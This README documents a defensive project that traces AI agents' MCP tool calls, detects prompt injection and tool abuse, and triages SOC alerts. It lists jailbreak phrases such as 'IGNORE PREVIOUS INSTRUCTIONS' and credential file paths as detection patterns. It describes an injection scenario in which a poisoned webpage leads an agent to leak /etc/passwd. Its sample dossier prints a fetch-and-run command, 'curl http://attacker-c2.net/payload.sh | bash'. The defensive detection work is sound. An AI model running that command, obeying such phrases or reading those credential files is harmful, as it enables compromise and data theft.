# Agentic SOC Guard: AI-Native Telemetry Tracing & Autonomous Agent Triage Engine

[![Python](https://img.shields.io/badge/Python-3.10%2B%20%7C%203.11%2B%20%7C%203.12%2B-blue.svg)](https://www.python.org/)
[![OpenTelemetry](https://img.shields.io/badge/OpenTelemetry-Tracing%201.20%2B-F5A800.svg)](https://opentelemetry.io/)
[![Protocol](https://img.shields.io/badge/MCP-Model%20Context%20Protocol-8A2BE2.svg)](https://modelcontextprotocol.io/)
[![Pydantic v2](https://img.shields.io/badge/Validation-Pydantic%20v2-E92063.svg)](https://docs.pydantic.dev/)
[![MITRE ATLAS](https://img.shields.io/badge/MITRE%20ATLAS-AML.T0054%20%7C%20AML.T0051-red.svg)](https://atlas.mitre.org/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-v14-orange.svg)](https://attack.mitre.org/)
[![Tests](https://img.shields.io/badge/Tests-22%2F22%20Passing-brightgreen.svg)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**Agentic SOC Guard** is a dual-pipeline security engineering framework designed to solve two critical challenges at the intersection of AI and modern Security Operations Centers (SOC):
1. **Defending the AI Infrastructure (Pipeline A)**: Real-time behavioral tracing and abuse detection for AI Agent runtimes and Model Context Protocol (MCP) tool invocations using OpenTelemetry instrumentation.
2. **AI for SOC Defense & Toil Reduction (Pipeline B)**: Autonomous Tier-1 SOC alert triage enforcing zero-hallucination guardrails, deterministic baseline correlation against local SQLite telemetry, and ADS-compliant (Alert Disposition System) investigation briefs.

Built directly on top of the **TelemetryLab** enterprise SQLite telemetry foundation (`telemetry.db`), this solution provides high-fidelity protection against prompt injections and tool escapes while slashing false-positive fatigue for SOC analysts.

---

## 1. System Architecture & Dual-Pipeline Data Flow

```
+-----------------------------------------------------------------------------------+
| PIPELINE A: AI-NATIVE TELEMETRY GUARD (DEFENDING THE AI INFRASTRUCTURE)            |
|                                                                                   |
|  [User / External Prompt]                                                         |
|           |                                                                       |
|           v                                                                       |
|  [AI Agent Runtime (MCP Host)]                                                    |
|           |                                                                       |
|           +---> [OpenTelemetry Tracer Middleware: otel_tracer.py]                 |
|                       |                                                           |
|                       | (Captures prompt, tool_name, tool_arguments, call_depth)  |
|                       v                                                           |
|           [Agent Tool Invocation (e.g., execute_shell, read_file, query_sql)]     |
|                       |                                                           |
|                       v                                                           |
|  [DETECTION ENGINE: mcp_tool_abuse_detector.py]                                   |
|   - Check 1: Tool Permission Boundary Crossing (e.g. agent escaping sandbox)      |
|   - Check 2: Indirect Prompt Injection Pattern in arguments                       |
|   - Check 3: Sensitive File Exfiltration (/etc/passwd, .env, cloud keys)          |
|   - Check 4: Out-of-Distribution Call Velocity (Loop / Denial-of-Wallet)           |
|                       |                                                           |
|                       v (Alert Fired)                                             |
|  [Telemetry Bus: SQLite / Structured JSON Alert Log]                              |
+-----------------------------------------------------------------------------------+
                                        |
                                        v
+-----------------------------------------------------------------------------------+
| PIPELINE B: AUTONOMOUS AGENTIC TRIAGE (AI FOR SOC DEFENSE & TOIL REDUCTION)       |
|                                                                                   |
|  [Raw Alert Stream (from Pipeline A, Wazuh, or TelemetryLab)]                     |
|           |                                                                       |
|           v                                                                       |
|  [Autonomous Triage Agent (Python + Local Ollama / LangChain)]                    |
|           |                                                                       |
|           +---> Step 1: Extract IOCs (IPs, Hashes, Commands, Usernames)           |
|           +---> Step 2: Query Baseline Context (SQLite telemetry history)         |
|           +---> Step 3: Run Deterministic Enrichers (Reverse DNS, CIDR, Heuristics)|
|           +---> Step 4: LLM Structured Reasoning (Prompt with Zero-Hallucination   |
|           |             Guardrails & Pydantic Output Enforcement)                 |
|           v                                                                       |
|  [TRIAGE BRIEF GENERATED: ADS-Compliant Markdown & JSON]                          |
|   - Severity Verdict: Confirmed True Positive / Benign Noise                      |
|   - Confidence Score: (0.00 - 1.00)                                               |
|   - Evidence Matrix: Exact matched logs and baseline deviations                   |
|   - Recommended Containment Actions: (Isolate Host, Revoke API Key, Reset Creds)  |
+-----------------------------------------------------------------------------------+
```

---

## 2. Core Capabilities & Threat Matrix

### Pipeline A: AI-Native Telemetry Guard
- **OpenTelemetry Semantic Instrumentation (`otel_tracer.py`)**: Intercepts every MCP tool invocation, emitting structured spans capturing `agent.session_id`, `agent.prompt`, `agent.tool.name`, `agent.tool.arguments`, `agent.call_depth`, and execution latency.
- **Permission Boundary Crossing Detection**: Blocks unauthorized access to sensitive filesystem credentials (`~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/shadow`, `/etc/passwd`, `.env`, `.kube/config`) and path traversal attempts (`../../`).
- **Indirect Prompt Injection Detection**: Flags jailbreak tokens (`IGNORE PREVIOUS INSTRUCTIONS`, `system prompt override`, `developer mode`) embedded in dynamic tool payloads.
- **Chained Context Poisoning Detection**: Correlates untrusted external ingestion (`fetch_webpage`, `read_email`) with immediate downstream privileged execution (`run_bash`, `terminal_exec`).
- **Denial-of-Wallet & Infinite Loop Defense**: Enforces safety thresholds on agent call depth (`depth >= 6`) and call velocity (`> 8 calls / 5s`), preventing resource exhaustion loops.

### Pipeline B: Autonomous SOC Agentic Triage
- **Deterministic 4-Step Pipeline**:
  1. **IOC Extraction**: Deterministic regex extraction of IPv4, SHA256/MD5 hashes, command lines, usernames, domains, and file targets.
  2. **Baseline Correlation**: Queries historical enterprise baselines in `telemetry.db` (`endpoint_process`, `identity_auth`, `network_flow`) to determine 30-day statistical execution frequency.
  3. **Heuristic Enrichment**: Computes Shannon entropy on commands/domains to uncover obfuscation/DGAs and classifies CIDR networks (RFC 1918 Private, Loopback, RFC 5737 Testnet, Untrusted WAN).
  4. **Zero-Hallucination Structured Reasoning**: Enforces Pydantic v2 data models with calibrated confidence scores (0.00 - 1.00) and strict ADS-compliant investigation reports. Supports local Ollama (`llama3:8b`, `mistral:7b`) with deterministic fallback.

| Threat Scenario | Attack Vector | MITRE ATLAS | MITRE ATT&CK | Engine Response |
| :--- | :--- | :--- | :--- | :--- |
| **Indirect Prompt Injection** | Poisoned webpage instructs agent to leak `/etc/passwd` | `AML.T0054` | `T1059.004` | Fired `AI_AGENT_INDIRECT_PROMPT_INJECTION` & `AI_AGENT_POISONED_CONTEXT_CHAIN` |
| **Sandbox / Privilege Escape** | Agent attempts reading `~/.aws/credentials` | `AML.T0054` | `T1552` | Fired `AI_AGENT_SENSITIVE_CREDENTIAL_READ` |
| **Denial-of-Wallet / Recursion**| Rapid cyclical tool polling loop (>8 calls in 5s) | `AML.T0040` | `T1499` | Fired `AI_AGENT_DENIAL_OF_WALLET_LOOP` & `AI_AGENT_CALL_DEPTH_EXCEEDED` |
| **Noisy IT Maintenance Alert** | Office spawning PowerShell by `system_deployer` | N/A | `T1059.001` | Triaged `FALSE_POSITIVE` (96% conf) & Auto-suppressed |
| **LSASS Credential Dumping** | `procdump64.exe` targeting LSASS memory | N/A | `T1003.001` | Triaged `TRUE_POSITIVE` (95% conf) & Host isolated |

---

## 3. Technical Stack & Dependencies

- **Core Runtime:** Python 3.10+ / 3.11+ / 3.12+
- **Telemetry & Tracing:** `opentelemetry-api`, `opentelemetry-sdk`
- **Protocol Standard:** Model Context Protocol (MCP) telemetry specification
- **Validation & Data Contracts:** `pydantic` v2, `sqlite3` (built-in standard library with WAL mode)
- **Local LLM Inference (Optional):** Local `ollama` (`llama3:8b` or `mistral:7b`) with zero-cost deterministic mock fallback
- **Testing:** `pytest`, `unittest`

---

## 4. Step-by-Step Build & Execution Guide

### Step 1: Create Virtual Environment & Install Dependencies
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Step 2: (Optional) Launch Local Ollama for Local Inference
```bash
# If Ollama is installed locally:
ollama run llama3:8b
# If Ollama is not installed, the engine automatically uses deterministic mock mode!
```

### Step 3: Run the AI Agent Telemetry Guard Simulation
Generates benign agent tool calls mixed with indirect prompt injection attacks, exporting OpenTelemetry traces to `sample_data/otel_spans.json`:
```bash
python3 -m telemetry_guard.mock_agent_stream
# Or via CLI: python3 cli.py guard-stream
```

### Step 4: Execute the Behavioral Detection Engine
Evaluates OpenTelemetry spans and logs high-fidelity alerts into the console and SQLite telemetry bus:
```bash
python3 -m telemetry_guard.mcp_tool_abuse_detector
# Or via CLI: python3 cli.py guard-detect
```

### Step 5: Run the Autonomous Triage Agent
Produces a structured investigation brief in seconds without manual analyst effort:
```bash
# Triage the AI Prompt Injection Alert:
python3 -m autonomous_triage.triage_agent --alert-id ALERT-AI-1048

# Triage the Routine Maintenance Alert (Demonstrating False Positive Reduction):
python3 -m autonomous_triage.triage_agent --alert-id ALERT-EP-1001

# List all available sample alerts:
python3 -m autonomous_triage.triage_agent --list
```

### Step 6: Run Comprehensive Automated Test Suite
Executes all 22 unit and integration tests across both pipelines:
```bash
python3 -m pytest tests/ -v
```

---

## 5. Sample Triage Dossier (ADS-Compliant Output)

Running `python3 -m autonomous_triage.triage_agent --alert-id ALERT-AI-1048`:

```markdown
# Autonomous SOC Triage Dossier: ALERT-AI-1048
**Rule:** `AI_AGENT_INDIRECT_INJECTION_EXFILTRATION` | **Generated By:** Agentic-SOC Autonomous Engine | **Standard:** ADS-Compliant

---

## 1. Executive Disposition
- **Verdict:** 🚨 **CONFIRMED TRUE POSITIVE**
- **Confidence Score:** `98.0%`
- **MITRE ATLAS / ATT&CK Mapping:** `AML.T0054`, `AML.T0051`, `T1059.004`
- **Immediate Recommended Action:** Immediately terminate AI Agent execution session, revoke downstream MCP tool credentials, and block destination IP 198.51.100.44 on boundary firewall.

---

## 2. Root Cause Analysis
Indirect prompt injection poisoned agent context, triggering downstream unauthorized bash execution targeting external network socket.

---

## 3. Evidence Matrix & Baseline Correlation
| Attribute | Observed in Alert | Historical Enterprise Baseline | Disposition Impact |
| :--- | :--- | :--- | :--- |
| **Command Execution** | `curl http://attacker-c2.net/payload.sh | bash` | `0` occurrences in 30d | Out-of-distribution anomaly |
| **User Identity** | `agent_researcher_02` | Standard / Unprivileged User | Potential Compromise |
| **Entropy Score** | `{"curl...": 4.287, "attacker-c2.net": 3.19}` | Normal Range: `< 3.5` | High Obfuscation / DGA |

---

## 4. Extracted Indicators of Compromise (IOCs)
- **Commands:** `['curl http://attacker-c2.net/payload.sh | bash']`
- **IP Addresses:** `['198.51.100.44']`
- **User Accounts:** `['agent_researcher_02']`
- **Target Files / Paths:** `['/etc/passwd']`
- **Network CIDR Classification:** `{'198.51.100.44': 'External Threat Emulation Range (RFC 5737 Testnet)'}`

---

## 5. Analyst Investigation Notes & Audit Trail
High-fidelity adversary activity exploiting LLM privilege boundary. Incident Commander escalation recommended.
```

Structured Pydantic v2 JSON Contract Output:
```json
{
  "alert_id": "ALERT-AI-1048",
  "verdict": "TRUE_POSITIVE",
  "confidence_score": 0.98,
  "root_cause_analysis": "Indirect prompt injection poisoned agent context, triggering downstream unauthorized bash execution targeting external network socket.",
  "mitre_mapping": [
    "AML.T0054",
    "AML.T0051",
    "T1059.004"
  ],
  "immediate_containment_action": "Immediately terminate AI Agent execution session, revoke downstream MCP tool credentials, and block destination IP 198.51.100.44 on boundary firewall.",
  "analyst_investigation_notes": "High-fidelity adversary activity exploiting LLM privilege boundary. Incident Commander escalation recommended."
}
```

---

## 6. Repository Structure

```
agentic-soc-guard/
├── README.md                      # Unified enterprise AI telemetry & triage guide
├── requirements.txt               # Lightweight dependencies (OTel, Pydantic, Pytest)
├── conftest.py                    # Pytest environment bootstrap
├── config.py                      # Database paths & SQLite WAL pragma configurations
├── cli.py                         # Unified CLI (detection engineering, guard, and triage)
├── app.py                         # Web playground bootstrap
├── server.py                      # REST API server exposing TelemetryLab and Guard endpoints
├── telemetry.db                   # Enterprise SQLite telemetry database
├── seed.sql                       # Clean portable SQL dump for Git reproducibility
├── telemetry_guard/               # [PIPELINE A] Defending the AI Infrastructure
│   ├── __init__.py
│   ├── otel_tracer.py             # OpenTelemetry instrumentation for AI agents & MCP
│   ├── mcp_tool_abuse_detector.py # Real-time behavioral detection rules
│   └── mock_agent_stream.py       # Simulates normal vs compromised AI tool invocations
├── autonomous_triage/             # [PIPELINE B] AI for SOC Defense & Toil Reduction
│   ├── __init__.py
│   ├── triage_agent.py            # Autonomous SOC triage engine (4-step pipeline)
│   ├── baseline_store.py          # SQLite interface querying enterprise baselines
│   ├── prompts.py                 # System prompts with zero-hallucination guardrails
│   └── output_schema.py           # Pydantic v2 structured output contracts
├── sample_data/                   # Test datasets and captured traces
│   ├── raw_alerts.json            # Realistic alerts for autonomous triage evaluation
│   ├── otel_spans.json            # OpenTelemetry trace captures
│   ├── auth_sample.csv            # Sample authentication logs
│   ├── network_sample.csv         # Sample network flow logs
│   └── cloud_sample.json          # Sample CloudTrail logs
├── schema/
│   └── schema.sql                 # TelemetryLab core tables & index definitions
├── rules/                         # Detection rule catalog & manifest
│   ├── rules_manifest.json
│   └── *.sql                      # MITRE ATT&CK SQL detection rules
├── web/                           # TelemetryLab interactive web dashboard
│   ├── index.html
│   ├── style.css
│   └── app.js
└── tests/                         # Automated test suite (22/22 Passing)
    ├── test_mcp_detector.py       # Validates Pipeline A detection rules
    ├── test_triage_agent.py       # Validates Pipeline B triage outputs & schemas
    └── test_telemetry_lab.py      # Validates TelemetryLab UDFs & schema engine
```

---

## 7. TelemetryLab Detection Engineering Foundation

The repository includes the full capabilities of **TelemetryLab**, a portable SQLite detection engineering workbench:

### Security SQLite UDFs:
- `REGEXP(pattern, text)`: High-performance regular expression matching natively in SQL.
- `ENTROPY(text)`: Shannon entropy calculation for detecting DGAs, base64 blobs, and command obfuscation.
- `IP_IN_CIDR(ip, cidr)`: Native CIDR evaluation in SQLite (`IP_IN_CIDR(src_ip, '10.0.0.0/8')`).

### CLI Utility Commands:
```bash
# Seed 500 baseline telemetry events with MITRE ATT&CK scenarios
python3 cli.py seed --count 500

# View table row counts and schema
python3 cli.py tables

# Run batch detection rules
python3 cli.py run-rules

# Benchmark false-positive tuning reduction
python3 cli.py tune-benchmark DET-EP-001

# Inspect MITRE coverage matrix
python3 cli.py mitre

# Launch local Web UI at http://127.0.0.1:8888
python3 app.py
```

---

## 8. Automated Verification & Testing

Run all unit and integration test suites:
```bash
python3 -m pytest tests/ -v
```

Output:
```
============================= test session starts ==============================
collected 22 items

tests/test_mcp_detector.py::TestMCPAgentDetector::test_benign_operations_produce_zero_false_positives PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_call_depth_and_velocity_detection PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_chained_context_poisoning PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_dangerous_shell_command_execution PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_forbidden_file_access_detection PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_indirect_prompt_injection_detection PASSED
tests/test_mcp_detector.py::TestMCPAgentDetector::test_sqlite_persistence PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_01_schema_initialization PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_02_security_udfs PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_03_telemetry_generation_and_attacks PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_04_detection_engine_and_rules PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_05_schema_transformations PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_06_ingest_csv_and_json PASSED
tests/test_telemetry_lab.py::TestTelemetryLab::test_07_export_and_import_dump PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_ads_markdown_brief_generation PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_baseline_store_integration PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_deterministic_enrichment_entropy_and_cidr PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_false_positive_reduction_scenario PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_ioc_extraction_accuracy PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_pydantic_schema_validation_enforcement PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_true_positive_ai_prompt_injection_scenario PASSED
tests/test_triage_agent.py::TestAutonomousTriageAgent::test_true_positive_lsass_dump_scenario PASSED

============================== 22 passed in 0.28s ==============================
```

---

## 9. Security Principles & Production Best Practices

1. **Principle of Least Privilege (PoLP)**: MCP Agent tools must never be granted unrestricted filesystem or shell execution rights. Path traversal guards block parent directory jumping.
2. **Deterministic-First Triage**: LLMs in security operations should never be allowed unconstrained hallucination. Baselines and IOCs are deterministically queried from local SQL telemetry before LLM ingestion.
3. **Calibrated Confidence**: Confidence scores are bound between `0.00` and `1.00` via strict Pydantic v2 validation.
4. **Auditability & Traceability**: Every triage disposition and detected alert is logged with millisecond timestamps and full contextual metadata in SQLite (`detection_alerts` and `autonomous_triage_log`).
# agentic-soc-guard
